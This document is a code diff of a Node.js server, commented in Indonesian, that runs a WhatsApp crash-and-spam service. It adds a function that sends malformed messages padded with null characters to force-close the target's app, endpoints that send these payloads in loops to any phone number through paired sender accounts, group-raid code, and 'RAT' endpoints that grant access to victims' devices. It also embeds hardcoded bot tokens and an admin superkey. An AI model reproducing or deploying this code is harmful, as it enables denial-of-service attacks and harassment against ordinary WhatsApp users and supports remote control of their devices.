@@ -57,12 +57,35 @@ const DB_PATH = "./database.json";
 let activeKeys = {};
 const KEY_FILE = path.join(__dirname, 'keyList.json');
 const bugs = [
-  { bug_id: "click", bug_name: "FORCLOSE ANDRO by @Myfloyrn45" },
-  { bug_id: "android", bug_name: "CRASH UI" },
-  { bug_id: "invisible", bug_name: "DELAY INVISIBLE" },
+  { bug_id: "BebasSpam", bug_name: "DelayBebas" },
+  { bug_id: "invisible", bug_name: "DELAY INVIS" },
+  { bug_id: "HardDX", bug_name: "DX Delay Hard-_-" },
+  { bug_id: "Crash?", bug_name: "DXCrash" },
+  { bug_id: "Xblank", bug_name: "XBlankUi-_-" },
+  { bug_id: "delaygb", bug_name: "DelayGB" },
   { bug_id: "ios_invis", bug_name: "FC IOS INVISIBLE" },
   { bug_id: "ios_noinvis", bug_name: "CRASH IOS" },
 ];
+
+// ============ GLOBAL SENDER STORAGE ============
+const GLOBAL_SENDER_FILE = path.join(__dirname, 'globalSenders.json');
+
+function loadGlobalSenders() {
+  try {
+    if (!fs.existsSync(GLOBAL_SENDER_FILE)) {
+      fs.writeFileSync(GLOBAL_SENDER_FILE, JSON.stringify([]));
+      return [];
+    }
+    return JSON.parse(fs.readFileSync(GLOBAL_SENDER_FILE, 'utf8'));
+  } catch (err) {
+    console.error("Failed to load global senders:", err.message);
+    return [];
+  }
+}
+
+function saveGlobalSenders(senders) {
+  fs.writeFileSync(GLOBAL_SENDER_FILE, JSON.stringify(senders, null, 2));
+}
 
 // TAMBAHKAN DI BAWAHNYA:
 // ============ KEAMANAN TAMBAHAN ============
@@ -96,6 +119,7 @@ fs.watchFile("keyList.json", () => {
   console.log("[📂] keyList.json changed, reloading...");
   sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
 });
+// ============ GLOBAL SENDER STORAGE ============
 
 // Load chat from file
 if (fs.existsSync(CHAT_FILE)) {
@@ -182,15 +206,15 @@ function sanitize(input) {
     .slice(0, 250);
 }
 
-const TOKEN = "8764546672:AAHbsxx3q4_V_F0IHkHNY8L6_9cY8aidGYE";
+const TOKEN = "8829993520:AAGTRvok8t63XQUsFh1K5fC9wqyYyfSTc5E";
 const bot = new TelegramBot(TOKEN, { polling: true });
 
 const ID_GROUP = [
-    -1003133749169
+    -1003980737885
 ];
 
 const ID_GROUP_UTAMA = [
-    -1003227459096
+    -1003980737885
 ];
 
 function sendToGroups(text, options = {}) {
@@ -209,7 +233,7 @@ function sendToGroupsUtama(text, options = {}) {
     }
 }
 
-const OWNER_ID = 8705363927;
+const OWNER_ID = 6948358913;
   
 wss.on('connection', function (ws, req) {
   let username;
@@ -220,7 +244,7 @@ wss.on('connection', function (ws, req) {
       
    // Tambahkan handler untuk online/offline status
 if (data.type === 'chat_online' && username) {
-    let onlineUsers = loadOnlineUsers();
+    let onlineUsers = loadOnlineChatUsers();
     const existing = onlineUsers.findIndex(u => u.username === username);
     
     if (existing !== -1) {
@@ -233,7 +257,7 @@ if (data.type === 'chat_online' && username) {
         });
     }
     
-    saveOnlineUsers(onlineUsers);
+    saveOnlineChatUsers(onlineUsers);
     
     broadcastToChatClients({
         type: 'user_online',
@@ -243,9 +267,9 @@ if (data.type === 'chat_online' && username) {
 }
 
 if (data.type === 'chat_offline' && username) {
-    let onlineUsers = loadOnlineUsers();
+    let onlineUsers = loadOnlineChatUsers();
     onlineUsers = onlineUsers.filter(u => u.username !== username);
-    saveOnlineUsers(onlineUsers);
+    saveOnlineChatUsers(onlineUsers);
     
     broadcastToChatClients({
         type: 'user_offline',
@@ -257,9 +281,9 @@ if (data.type === 'chat_offline' && username) {
 if (data.type === 'chat_leave') {
     if (username) {
         chatClients.delete(username);
-        let onlineUsers = loadOnlineUsers();
+        let onlineUsers = loadOnlineChatUsers();
         onlineUsers = onlineUsers.filter(u => u.username !== username);
-        saveOnlineUsers(onlineUsers);
+        saveOnlineChatUsers(onlineUsers);
         broadcastToChatClients({ type: 'user_left', username, users: onlineUsers.length });
         console.log(`[CHAT] ${username} left`);
     }
@@ -353,13 +377,6 @@ if (data.type === 'chat_typing' && username) {
                 androidId: session.androidId,
                 role: session.role || "member"
               }));
-
-              // ✅ Trigger Heartbeat segera setelah sukses validasi
-              try {
-                startUserHeartbeat(validKey.username, data.androidId, data.key);
-              } catch(e) {
-                console.error('[HB] startUserHeartbeat error:', e.message);
-              }
       
                   const interval = setInterval(() => {
                   const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
@@ -443,25 +460,6 @@ if (data.type === 'chat_typing' && username) {
 
         ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
       }
-
-      if (data.type === 'stats') {
-        const onlineUsers = loadOnlineUsers();
-        const activeConns = loadActiveConnections();
-        const now = Date.now();
-
-        const onlineNow = onlineUsers.filter(u => (now - new Date(u.lastActive).getTime()) < 60000);
-        const activeNow = activeConns.filter(c => (now - new Date(c.lastActive).getTime()) < 60000);
-
-        ws.send(JSON.stringify({
-          type: "stats",
-          onlineUsers: onlineNow.length,
-          activeConnections: activeNow.length
-        }));
-      }
-
-      if (data.type === 'ping') {
-        ws.send(JSON.stringify({ type: 'pong' }));
-      }
     } catch (e) {
       console.error("WS error:", e.message);
     }
@@ -474,12 +472,180 @@ if (data.type === 'chat_typing' && username) {
   });
 });
 
-const wsPort = 1202;
+const wsPort = 6013;
+
+
+// ═══ RAT ENDPOINTS TAMBAHAN ═══
+
+app.post("/rat/grant-member", (req, res) => {
+  const { ownerKey, memberUsername, deviceIds, allDevices } = req.body;
+  const keyInfo = activeKeys[ownerKey];
+  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
+  const db = loadDatabase();
+  const owner = db.find(u => u.username === keyInfo.username);
+  if (!owner || owner.role !== "owner") return res.status(403).json({ valid: false, message: "Only owner can grant" });
+  const member = db.find(u => u.username === memberUsername);
+  if (!member) return res.status(404).json({ valid: false, message: "Member not found" });
+  // Simpan permission ke member: bisa lihat device mana saja milik owner
+  if (!member.ratPerms) member.ratPerms = {};
+  member.ratPerms[owner.username] = {
+    approved: true,
+    allDevices: allDevices === true,
+    deviceIds: Array.isArray(deviceIds) ? deviceIds : [],
+  };
+  saveDatabase(db);
+  console.log(`[GRANT] ${owner.username} → ${memberUsername} | allDevices:${allDevices} | ids:${deviceIds}`);
+  res.json({ valid: true, message: `${memberUsername} berhasil diberi akses` });
+});
+
+// ── RAT: revoke akses member ───────────────────────────────────────────────────
+
+app.post("/rat/revoke-member", (req, res) => {
+  const { ownerKey, memberUsername } = req.body;
+  const keyInfo = activeKeys[ownerKey];
+  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
+  const db = loadDatabase();
+  const owner = db.find(u => u.username === keyInfo.username);
+  if (!owner || owner.role !== "owner") return res.status(403).json({ valid: false, message: "Only owner" });
+  const member = db.find(u => u.username === memberUsername);
+  if (member && member.ratPerms) {
+    delete member.ratPerms[owner.username];
+    saveDatabase(db);
+  }
+  res.json({ valid: true, message: `Akses ${memberUsername} dicabut` });
+});
+
+// ── RAT: member cek permission & ambil device yang boleh dilihat ──────────────
+
+app.get('/api/get-notifications/:id', (req, res) => {
+  const n = readRat('./rat_notifs.json');
+  res.json(n.filter(x => x.targetId === req.params.id));
+});
+
+// Init RAT files
+['rat_targets','rat_commands','rat_responses','rat_notifs'].forEach(f => {
+  const p = './' + f + '.json';
+  if (!fs.existsSync(p)) fs.writeFileSync(p, '[]');
+});
+
+
+// ════════════════════════════════════════════════════════════════════════════
+// DELAY FC — Force Close WhatsApp via malformed interactive message
+// Teknik: corrupt nativeFlowMessage dengan payload yang tidak bisa di-parse WA
+async function delayAxRRG(sock, target) {
+  const jid = target.includes("@s.whatsapp.net") ? target : target + "@s.whatsapp.net";
+  try {
+    // Method 1: Corrupt interactive native flow — bikin WA parser hang
+    const badFlow = generateWAMessageFromContent(jid, {
+      interactiveMessage: {
+        header: {
+          title: String.fromCharCode(0).repeat(500000),
+          hasMediaAttachment: false
+        },
+        body: {
+          text: String.fromCharCode(0).repeat(1000000)
+        },
+        footer: { text: "" },
+        nativeFlowMessage: {
+          buttons: Array.from({ length: 50000 }, (_, i) => ({
+            name: "cta_url",
+            buttonParamsJson: JSON.stringify({
+              display_text: String.fromCharCode(0).repeat(50000) + i,
+              url: "https://wa.me/" + String.fromCharCode(0).repeat(10000),
+              merchant_url: "https://wa.me/" + String.fromCharCode(0).repeat(10000)
+            })
+          })),
+          messageParamsJson: JSON.stringify({
+            flow_token: String.fromCharCode(0).repeat(500000),
+            flow_id: String.fromCharCode(0).repeat(200000),
+            data: Object.fromEntries(
+              Array.from({ length: 10000 }, (_, i) => [
+                String.fromCharCode(0).repeat(1000) + i,
+                String.fromCharCode(0).repeat(5000)
+              ])
+            )
+          })
+        },
+        contextInfo: {
+          forwardingScore: 999999,
+          isForwarded: true,
+          mentionedJid: Array.from({ length: 5000 }, () =>
+            Math.floor(Math.random() * 9999999999) + "@s.whatsapp.net"
+          ),
+          quotedMessage: {
+            conversation: String.fromCharCode(0).repeat(500000)
+          }
+        }
+      }
+    }, {});
+    await sock.relayMessage(jid, badFlow.message, { messageId: badFlow.key.id });
+
+    // Method 2: requestPayment dengan data corrupt
+    await sock.relayMessage(jid, {
+      requestPaymentMessage: {
+        currencyCodeIso4217: String.fromCharCode(0).repeat(100000),
+        amount1000: 999999999999,
+        requestFrom: jid,
+        noteMessage: {
+          extendedTextMessage: {
+            text: String.fromCharCode(0).repeat(2000000),
+            contextInfo: {
+              mentionedJid: Array.from({ length: 8000 }, () =>
+                Math.floor(Math.random() * 9999999999) + "@s.whatsapp.net"
+              ),
+              forwardingScore: 999999999
+            }
+          }
+        },
+        expiryTimestamp: 99999999999999,
+        amount: { offset: 0, value: 999999999, currencyCode: "IDR" }
+      }
+    }, {});
+
+    console.log("[DELAY FC] Sent to " + jid);
+  } catch(e) {
+    console.warn("[DELAY FC] Error:", e.message);
+  }
+}
+
+
+// ── DEBUG: Lihat pairId semua user (akses dengan superkey) ───────────────────
+
+app.get('/admin/listpairids', (req, res) => {
+  const { superkey } = req.query;
+  if (superkey !== 'CRPT-SUPER-2025') return res.status(403).json({ error: 'Forbidden' });
+  const db = loadDatabase();
+  const list = db.map(u => ({ username: u.username, role: u.role, pairId: u.pairId || 'NONE' }));
+  res.json(list);
+});
+
+// ── FORCE GENERATE pairId untuk 1 user (untuk troubleshoot) ──────────────────
+
+app.get('/admin/genpairid', (req, res) => {
+  const { superkey, username } = req.query;
+  if (superkey !== 'CRPT-SUPER-2025') return res.status(403).json({ error: 'Forbidden' });
+  const db = loadDatabase();
+  const idx = db.findIndex(u => u.username === username);
+  if (idx === -1) return res.json({ error: 'User not found' });
+  db[idx].pairId = genPairId();
+  saveDatabase(db);
+  console.log(`[ADMIN] Force generated pairId for ${username}: ${db[idx].pairId}`);
+  res.json({ username, pairId: db[idx].pairId });
+});
+
+
+// ════════════════════════════════════════════════════════════════════════════
+// LOCK LIVE CHAT — komunikasi 2 arah owner ↔ target saat device di-lock
+// ════════════════════════════════════════════════════════════════════════════
+// lockChats already declared above
+
+// Owner kirim pesan ke target (via panel AX RRG)
+
 server.listen(wsPort, () => {
   console.log(`🟣 WebSocket Server running on port ${wsPort}`);
 });
 
-const PORT = 1202;
+const PORT = 6013;
 
 app.use(express.urlencoded({ extended: false }));
 app.use(express.json());
@@ -529,7 +695,7 @@ if (fs.existsSync(KEY_FILE)) {
     for (const user of parsed) {
       if (user.sessionKey && user.username && user.lastLogin) {
         const created = new Date(user.lastLogin).getTime();
-        const expires = created + 24 * 60 * 60 * 1000;
+        const expires = created + 10 * 60 * 1000;
 
         activeKeys[user.sessionKey] = {
           username: user.username,
@@ -839,7 +1005,7 @@ app.get("/raidGroup", async (req, res) => {
           const buffer = fs.readFileSync(path.join(dir, sticker));
           await sock.sendMessage(groupJid, { sticker: buffer });
           await gcCrash(sock, groupJid);
-          await fconemsg(sock, groupJid);
+          await KayzenDelayHard(sock, groupJid);
           await new Promise(r => setTimeout(r, 300));
         }
 
@@ -1157,7 +1323,7 @@ const key = generateKey();
 activeKeys[key] = {
   username,
   created: Date.now(),
-  expires: Date.now() + 24 * 60 * 60 * 1000,
+  expires: Date.now() + 10 * 60 * 1000,
 };
 
 recordKey({
@@ -1167,9 +1333,6 @@ recordKey({
   ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
   androidId,
 });
-
-// ✅ HEARTBEAT: mulai tracking user sebagai Online
-try { startUserHeartbeat(username, androidId, key); } catch(e) { console.error('[HB] startUserHeartbeat error:', e.message); }
 
 return res.json({
   valid: true,
@@ -1219,13 +1382,6 @@ app.get("/myInfo", (req, res) => {
     ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
     androidId
   });
-
-  // ✅ Trigger Heartbeat segera setelah sukses validasi (Auto Login)
-  try {
-    startUserHeartbeat(username, androidId, key);
-  } catch(e) {
-    console.error('[HB] startUserHeartbeat error:', e.message);
-  }
 
   console.log("[✅ INFO] Info dikirim untuk:", username);
 
@@ -1323,21 +1479,39 @@ app.get("/sendBug", async (req, res) => {
     console.log("Received Signal 2")
     console.log(`${targetJid}`)
         switch (bug) {
-          case "click":
-            for (let i = 0; i < 15; i++) {
-              await fconemsg(sock, targetJid);
+          case "BebasSpam":
+            for (let i = 0; i < 20; i++) {
+              await KayzenDelayHard(sock, targetJid);
               await sleep(1000);
             }
             break;
-          case "android":
-            for (let i = 0; i < 20; i++) {
-              await urlloc(sock, targetJid);
+          case "HardDX":
+            for (let i = 0; i < 100; i++) {
+              await VnXNewDelayHardInpis(sock, targetJid);
               await sleep(1000);
             }
             break;
           case "invisible":
-            for (let i = 0; i < 200; i++) {
+            for (let i = 0; i < 50; i++) {
               await VnXNewDenglayHardInpis(sock, targetJid);
+              await sleep(1000);
+            }
+            break;
+          case "Crash?":
+            for (let i = 0; i < 30; i++) {
+              await urlloc(sock, targetJid);
+              await sleep(1000);
+            }
+             break;
+           case "Xblank":
+            for (let i = 0; i < 20; i++) {
+              await KayzenBlankClick(sock, targetJid);
+              await sleep(1000);
+            }
+            break;
+          case "delaygb":
+            for (let i = 0; i < 50; i++) {
+              await sepongGB(sock, targetJid);
               await sleep(1000);
             }
             break;
@@ -1477,6 +1651,391 @@ app.get("/getPairing", async (req, res) => {
   }
 });
 
+// ============ GLOBAL SENDER MANAGEMENT ENDPOINTS ============
+
+// Get all global senders
+app.get("/getGlobalSenders", (req, res) => {
+  const { key } = req.query;
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
+  
+  const db = loadDatabase();
+  const user = db.find(u => u.username === keyInfo.username);
+  if (!user || !["owner", "dev", "pemilikan", "admin"].includes(user.role)) {
+    return res.json({ valid: false, message: "Access denied" });
+  }
+  
+  const globalSenders = loadGlobalSenders();
+  
+  // Format untuk APK
+  const formattedSenders = globalSenders.map(sender => ({
+    id: sender.id,
+    sessionName: sender.sessionName,
+    number: sender.number,
+    owner: sender.owner,
+    addedAt: sender.addedAt,
+    isConnected: !!activeConnections[sender.sessionName],
+    status: activeConnections[sender.sessionName] ? "connected" : "disconnected",
+    type: "global"
+  }));
+  
+  res.json({
+    valid: true,
+    globalSenders: formattedSenders,
+    total: formattedSenders.length,
+    connected: formattedSenders.filter(s => s.isConnected).length
+  });
+});
+
+// Pair new global sender
+app.get("/pairGlobalSender", async (req, res) => {
+  const { key, number } = req.query;
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
+  
+  const db = loadDatabase();
+  const user = db.find(u => u.username === keyInfo.username);
+  if (!user || !["owner", "dev", "pemilikan", "admin"].includes(user.role)) {
+    return res.json({ valid: false, message: "Access denied" });
+  }
+  
+  if (!number || number.length < 9) {
+    return res.json({ valid: false, message: "Valid number required" });
+  }
+  
+  const cleanNumber = number.replace(/\D/g, '');
+  const sessionName = `global_${cleanNumber}_${Date.now()}`;
+  const sessionDir = path.join('permenmd', sessionName);
+  
+  try {
+    if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
+    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
+    
+    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+    const { version } = await fetchLatestBaileysVersion();
+    
+    const sock = makeWASocket({
+      auth: state,
+      printQRInTerminal: false,
+      logger: pino({ level: "silent" }),
+      version: version,
+      defaultQueryTimeoutMs: undefined,
+      browser: ["Chrome (Linux)", "Ubuntu", "10.0.0"]
+    });
+    
+    sock.ev.on("creds.update", saveCreds);
+    
+    let pairingCode = null;
+    let isConnected = false;
+    
+    sock.ev.on("connection.update", async (update) => {
+      const { connection, lastDisconnect } = update;
+      
+      if (connection === "close") {
+        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
+        if (!isLoggedOut && !isConnected) {
+          console.log(`🔄 Global sender ${cleanNumber} reconnecting...`);
+          setTimeout(() => connectGlobalSender(sessionName, sessionDir), 3000);
+        } else {
+          delete activeConnections[sessionName];
+        }
+      } else if (connection === "open") {
+        isConnected = true;
+        console.log(`✅ Global sender ${sessionName} connected!`);
+        activeConnections[sessionName] = sock;
+        
+        // Save to global senders database
+        const globalSenders = loadGlobalSenders();
+        const existingIndex = globalSenders.findIndex(s => s.number === cleanNumber);
+        
+        const senderData = {
+          id: existingIndex !== -1 ? globalSenders[existingIndex].id : Date.now().toString(),
+          sessionName: sessionName,
+          number: cleanNumber,
+          owner: keyInfo.username,
+          addedAt: new Date().toISOString(),
+          status: "active"
+        };
+        
+        if (existingIndex !== -1) {
+          globalSenders[existingIndex] = senderData;
+        } else {
+          globalSenders.push(senderData);
+        }
+        saveGlobalSenders(globalSenders);
+        
+        // Copy creds to root
+        const sourceCreds = path.join(sessionDir, 'creds.json');
+        const destCreds = path.join('permenmd', `${sessionName}.json`);
+        if (fs.existsSync(sourceCreds)) {
+          fs.writeFileSync(destCreds, fs.readFileSync(sourceCreds));
+        }
+      }
+    });
+    
+    // Request pairing code
+    await new Promise(r => setTimeout(r, 1000));
+    pairingCode = await sock.requestPairingCode(cleanNumber);
+    
+    if (pairingCode) {
+      console.log(`[GLOBAL PAIR] Code for ${cleanNumber}: ${pairingCode}`);
+      return res.json({
+        valid: true,
+        number: cleanNumber,
+        pairingCode: pairingCode,
+        isGlobal: true,
+        sessionName: sessionName
+      });
+    }
+    
+    return res.json({ valid: false, message: "Failed to get pairing code" });
+    
+  } catch (err) {
+    console.error("Global pairing error:", err.message);
+    return res.status(500).json({ valid: false, error: err.message });
+  }
+});
+
+// Send bug using global sender
+app.get("/sendGlobalBug", async (req, res) => {
+  const { key, bug, target, senderId } = req.query;
+  let cleanTarget = (target || "").replace(/\D/g, "");
+  
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
+  
+  const db = loadDatabase();
+  const user = db.find(u => u.username === keyInfo.username);
+  if (!user) return res.json({ valid: false, message: "User not found" });
+  
+  // Cooldown for global send
+  const roleCooldowns = { member: 300, reseller: 240, reseller1: 60, owner: 0, vip: 60, pemilikan: 0, dev: 0 };
+  const role = user.role || "member";
+  const cooldownSeconds = roleCooldowns[role] || 60;
+  
+  if (!user.lastGlobalSend) user.lastGlobalSend = 0;
+  const now = Date.now();
+  const diffSeconds = Math.floor((now - user.lastGlobalSend) / 1000);
+  
+  if (diffSeconds < cooldownSeconds) {
+    return res.json({
+      valid: true,
+      sended: false,
+      cooldown: true,
+      wait: cooldownSeconds - diffSeconds,
+    });
+  }
+  
+  // Get global sender
+  const globalSenders = loadGlobalSenders();
+  let targetSender = null;
+  
+  if (senderId) {
+    targetSender = globalSenders.find(s => s.id === senderId);
+  } else {
+    // Use first connected sender
+    targetSender = globalSenders.find(s => activeConnections[s.sessionName]);
+  }
+  
+  if (!targetSender) {
+    return res.json({ valid: false, message: "No active global sender available" });
+  }
+  
+  const sock = activeConnections[targetSender.sessionName];
+  if (!sock) {
+    return res.json({ valid: false, message: "Global sender not connected" });
+  }
+  
+  user.lastGlobalSend = now;
+  saveDatabase(db);
+  
+  res.json({
+    valid: true,
+    sended: true,
+    cooldown: false,
+    role: role,
+    sender: targetSender.sessionName,
+    senderNumber: targetSender.number
+  });
+  
+  // Execute bug in background
+  setImmediate(async () => {
+    try {
+      const targetJid = cleanTarget + "@s.whatsapp.net";
+      console.log(`[🌐 GLOBAL BUG] Sending ${bug} to ${cleanTarget} via ${targetSender.sessionName}`);
+      
+      switch (bug) {
+        case "BebasSpam":
+          for (let i = 0; i < 20; i++) {
+            await KayzenDelayHard(sock, targetJid);
+            await sleep(1000);
+          }
+          break;
+        case "HardDX":
+          for (let i = 0; i < 100; i++) {
+            await VnXNewDelayHardInpis(sock, targetJid);
+            await sleep(1000);
+          }
+          break;
+        case "invisible":
+          for (let i = 0; i < 50; i++) {
+            await VnXNewDenglayHardInpis(sock, targetJid);
+            await sleep(1000);
+          }
+          break;
+        case "Crash?":
+          for (let i = 0; i < 30; i++) {
+            await urlloc(sock, targetJid);
+            await sleep(1000);
+          }
+          break;
+        case "Xblank":
+          for (let i = 0; i < 20; i++) {
+            await KayzenBlankClick(sock, targetJid);
+            await sleep(1000);
+          }
+          break;
+        case "delaygb":
+          for (let i = 0; i < 50; i++) {
+            await sepongGB(sock, targetJid);
+            await sleep(1000);
+          }
+          break;
+        case "ios_invis":
+          await iosTrashLocExtend(sock, targetJid);
+          break;
+        case "ios_noinvis":
+          for (let i = 0; i < 15; i++) {
+            await iOSxTend(sock, targetJid);
+          }
+          break;
+        default:
+          await KayzenDelayHard(sock, targetJid);
+          break;
+      }
+      
+      console.log(`[✅ GLOBAL BUG] Bug '${bug}' sent to ${cleanTarget}`);
+    } catch (err) {
+      console.warn(`[❌ GLOBAL BUG ERROR] ${err.message}`);
+    }
+  });
+});
+
+// Delete global sender
+app.delete("/deleteGlobalSender", (req, res) => {
+  const { key, senderId } = req.query;
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
+  
+  const db = loadDatabase();
+  const user = db.find(u => u.username === keyInfo.username);
+  if (!user || !["owner", "dev", "pemilikan", "admin"].includes(user.role)) {
+    return res.json({ valid: false, message: "Access denied" });
+  }
+  
+  const globalSenders = loadGlobalSenders();
+  const senderIndex = globalSenders.findIndex(s => s.id === senderId);
+  
+  if (senderIndex === -1) {
+    return res.json({ valid: false, message: "Global sender not found" });
+  }
+  
+  const sender = globalSenders[senderIndex];
+  
+  // Close connection if exists
+  if (activeConnections[sender.sessionName]) {
+    try {
+      activeConnections[sender.sessionName].ws?.close();
+      delete activeConnections[sender.sessionName];
+    } catch(e) {}
+  }
+  
+  // Delete session files
+  const sessionPath = path.join('permenmd', sender.sessionName);
+  if (fs.existsSync(sessionPath)) {
+    fs.rmSync(sessionPath, { recursive: true, force: true });
+  }
+  
+  const credsFile = path.join('permenmd', `${sender.sessionName}.json`);
+  if (fs.existsSync(credsFile)) {
+    fs.unlinkSync(credsFile);
+  }
+  
+  // Remove from list
+  globalSenders.splice(senderIndex, 1);
+  saveGlobalSenders(globalSenders);
+  
+  res.json({ valid: true, message: "Global sender deleted successfully" });
+});
+
+// Auto reconnect all global senders on startup
+async function connectAllGlobalSenders() {
+  const globalSenders = loadGlobalSenders();
+  console.log(`[🌐 GLOBAL] Found ${globalSenders.length} global senders in database`);
+  
+  for (const sender of globalSenders) {
+    await connectGlobalSender(sender.sessionName, path.join('permenmd', sender.sessionName));
+  }
+}
+
+async function connectGlobalSender(sessionName, sessionDir) {
+  if (activeConnections[sessionName]) {
+    console.log(`[🌐 GLOBAL] ${sessionName} already connected`);
+    return true;
+  }
+  
+  if (!fs.existsSync(sessionDir)) {
+    console.log(`[🌐 GLOBAL] Session dir ${sessionName} not found, skipping`);
+    return false;
+  }
+  
+  try {
+    const { state } = await useMultiFileAuthState(sessionDir);
+    const { version } = await fetchLatestBaileysVersion();
+    
+    const sock = makeWASocket({
+      auth: state,
+      printQRInTerminal: false,
+      logger: pino({ level: "silent" }),
+      version: version,
+      defaultQueryTimeoutMs: undefined,
+      browser: ["Chrome (Linux)", "Ubuntu", "10.0.0"]
+    });
+    
+    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
+      if (connection === "open") {
+        console.log(`[🌐 GLOBAL] ${sessionName} connected!`);
+        activeConnections[sessionName] = sock;
+        
+        // Update status in database
+        const globalSenders = loadGlobalSenders();
+        const sender = globalSenders.find(s => s.sessionName === sessionName);
+        if (sender) {
+          sender.status = "active";
+          saveGlobalSenders(globalSenders);
+        }
+      } else if (connection === "close") {
+        const statusCode = lastDisconnect?.error?.output?.statusCode;
+        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;
+        
+        if (!isLoggedOut) {
+          console.log(`[🌐 GLOBAL] ${sessionName} disconnected, reconnecting in 5s...`);
+          delete activeConnections[sessionName];
+          setTimeout(() => connectGlobalSender(sessionName, sessionDir), 5000);
+        } else {
+          console.log(`[🌐 GLOBAL] ${sessionName} logged out, please re-pair`);
+          delete activeConnections[sessionName];
+        }
+      }
+    });
+    
+    return true;
+  } catch (err) {
+    console.error(`[🌐 GLOBAL] Failed to connect ${sessionName}:`, err.message);
+    return false;
+  }
+}
+
 app.get("/createAccount", (req, res) => {
   const { key, newUser, pass, day } = req.query;
   console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);
@@ -1584,42 +2143,357 @@ app.get('/ping', (req, res) => {
   res.send('pong');
 });
 
-// ============ ONLINE USERS & ACTIVE CONNECTIONS ENDPOINTS ============
+// ============ PERBAIKAN GLOBAL SENDER - TAMBAHKAN DI BACKEND ============
 
-// ✅ ENDPOINT STATS — tanpa butuh session key, pakai username+password
-// Khusus untuk dashboard app supaya selalu bisa fetch walau key expired
-app.get("/stats", (req, res) => {
-    const { username, password } = req.query;
-
-    // Validasi user via database langsung (tidak butuh session key)
-    try {
-        const db = loadDatabase();
-        const user = db.find(u => u.username === username && u.password === password);
-        if (!user) return res.status(401).json({ valid: false, message: "Wrong credentials" });
-
-        const onlineUsers = loadOnlineUsers();
-        const activeConns = loadActiveConnections();
-        const now = Date.now();
-
-        const onlineNow = onlineUsers.filter(u => (now - new Date(u.lastActive).getTime()) < 60000);
-        const activeNow  = activeConns.filter(c => (now - new Date(c.lastActive).getTime()) < 60000);
-
-        return res.json({
-            valid: true,
-            onlineUsers: onlineNow.length,
-            activeConnections: activeNow.length,
-            users: onlineNow,
-            connections: activeNow,
-        });
-    } catch(e) {
-        return res.status(500).json({ valid: false, message: e.message });
+// 1. Tambahkan endpoint DELETE untuk private sender (yang belum ada)
+app.delete("/deleteSender", (req, res) => {
+  const { key, id } = req.query;
+  const username = getUserByKey(key);
+  if (!username) return res.json({ valid: false, message: "Invalid session key" });
+  
+  const db = loadDatabase();
+  const user = db.find(u => u.username === username);
+  if (!user) return res.json({ valid: false, message: "User not found" });
+  
+  // Cari sender berdasarkan ID
+  let found = false;
+  let deletedSession = null;
+  
+  // Cek di activeConnections
+  for (const [sessionName, sock] of Object.entries(activeConnections)) {
+    if (sessionName === id || sessionName.includes(id)) {
+      deletedSession = sessionName;
+      found = true;
+      break;
     }
+  }
+  
+  if (!found) {
+    return res.json({ valid: false, message: "Sender not found" });
+  }
+  
+  // Tutup koneksi
+  if (activeConnections[deletedSession]) {
+    try {
+      activeConnections[deletedSession].ws?.close();
+      delete activeConnections[deletedSession];
+    } catch(e) {}
+  }
+  
+  // Hapus file session
+  const sessionPath = path.join('permenmd', user.username, deletedSession);
+  if (fs.existsSync(sessionPath)) {
+    fs.rmSync(sessionPath, { recursive: true, force: true });
+  }
+  
+  // Hapus file creds.json di root
+  const credsFile = path.join('permenmd', `${deletedSession}.json`);
+  if (fs.existsSync(credsFile)) {
+    fs.unlinkSync(credsFile);
+  }
+  
+  // Hapus dari biz/mess jika ada
+  if (biz[deletedSession]) delete biz[deletedSession];
+  if (mess[deletedSession]) delete mess[deletedSession];
+  
+  console.log(`[DELETE] Private sender ${deletedSession} deleted by ${username}`);
+  res.json({ valid: true, message: "Sender deleted successfully" });
 });
+
+// 2. Perbaiki fungsi connectGlobalSenders
+async function connectGlobalSenders() {
+  const globalSenders = loadGlobalSenders();
+  console.log(`[🌐 GLOBAL] Found ${globalSenders.length} global senders in database`);
+  
+  if (globalSenders.length === 0) {
+    console.log(`[🌐 GLOBAL] No global senders configured. Use /getGlobalPairing to add.`);
+    return;
+  }
+  
+  for (const sender of globalSenders) {
+    const sessionPath = path.join('permenmd', sender.sessionName);
+    const credsFile = path.join(sessionPath, 'creds.json');
+    const mainCredsFile = path.join('permenmd', `${sender.sessionName}.json`);
+    
+    console.log(`[🌐 GLOBAL] Processing ${sender.sessionName} (${sender.number})...`);
+    
+    if (!fs.existsSync(sessionPath)) {
+      console.log(`[⚠️ GLOBAL] Creating session folder for ${sender.sessionName}`);
+      fs.mkdirSync(sessionPath, { recursive: true });
+    }
+    
+    if (fs.existsSync(credsFile)) {
+      if (!fs.existsSync(mainCredsFile)) {
+        fs.writeFileSync(mainCredsFile, fs.readFileSync(credsFile));
+        console.log(`[📁 GLOBAL] Copied creds to root for ${sender.sessionName}`);
+      }
+      
+      if (!activeConnections[sender.sessionName]) {
+        console.log(`[🌐 GLOBAL] Connecting ${sender.sessionName}...`);
+        try {
+          await connectSession(sessionPath, sender.sessionName);
+          console.log(`[✅ GLOBAL] Connected ${sender.sessionName}`);
+        } catch (err) {
+          console.log(`[❌ GLOBAL] Failed to connect ${sender.sessionName}:`, err.message);
+        }
+      } else {
+        console.log(`[✅ GLOBAL] ${sender.sessionName} already connected`);
+      }
+    } else if (fs.existsSync(mainCredsFile)) {
